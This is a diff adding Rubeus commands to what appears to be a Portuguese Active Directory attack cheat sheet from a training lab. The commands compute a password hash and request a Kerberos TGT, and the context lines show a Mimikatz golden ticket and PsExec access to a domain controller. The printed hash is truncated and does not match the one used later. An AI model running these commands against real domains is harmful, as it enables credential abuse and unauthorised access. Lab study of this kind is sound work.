@@ -3050,6 +3050,16 @@ kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-312420
 ```
 .\PsExec.exe -accepteula \\dcorp-dc cmd
 ```
+##### RUBEUS - COMANDOS
+1. RUBEUS - GERAR O HASH DA SENHA:
+```
+.\rubeus.exe hash /user:student209 /password:m2RrLsadasdasG6pTh /domain:dollarcorp.moneycorp.local
+2E21DC42BFB4812954A6BC5A0
+```
+2. RUBEUS - SOLICITAR TGT:
+```
+.\rubeus.exe asktgt /user:student209 /rc4:2E21DC42BFB4812954A6BC5A01021D53 /domain:dollarcorp.moneycorp.local  /nopac /nowrap /dc:dcorp-dc.dollarcorp.moneycorp.local
+```
 
 
 
